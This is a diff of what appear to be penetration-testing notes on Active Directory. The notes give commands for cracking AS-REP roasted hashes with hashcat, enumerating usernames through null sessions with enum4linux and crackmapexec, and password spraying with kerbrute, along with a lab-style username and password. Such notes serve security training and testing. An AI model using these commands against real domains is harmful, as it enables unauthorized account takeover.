@@ -11,9 +11,10 @@ cat hashes - look for any usernames with hashes here to crack <br>
 <br>
 To crack this with hashcat, you need to add a 23 to the hash between rep and name - so e.g $krb5asrep$23$asdas - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat<br>
 hashcat mode -m 18200 <br>
-<h1> Username grabbing via NULL session </h1> <br>
+<h1> Username grabbing </h1> <br>
 enum4linux -U DCIP  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" <br>
-crackmapexec smb 172.16.5.5 --users <br>
+crackmapexec smb 172.16.5.5 --users (this is null session <br>
+If you have creds - sudo crackmapexec smb 172.16.7.3 -u AB920 -p weasal --users <br>
 Can now spray passwords with kerbrute - kerbrute passwordspray -d domain --dc IP validusers.txt Welcome1
 <br>
 
